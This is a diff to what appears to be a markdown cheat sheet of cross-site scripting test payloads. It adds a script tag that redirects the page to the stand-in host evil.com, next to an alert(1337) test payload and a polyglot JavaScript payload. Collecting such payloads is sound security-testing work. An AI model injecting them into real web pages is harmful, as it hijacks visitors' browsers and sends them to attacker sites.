@@ -40,6 +40,9 @@ JavaScript​://%250A/*?'/*\'/*"/*\"/*`/*\`/*%26apos;)/*
 ---
 
 ## Testing XSS in Various Scenarios
+```
+<script>document.location.href = "http://evil.com";</script>
+```
 ```javascript
 <script>alert(1337)</script>
 ```
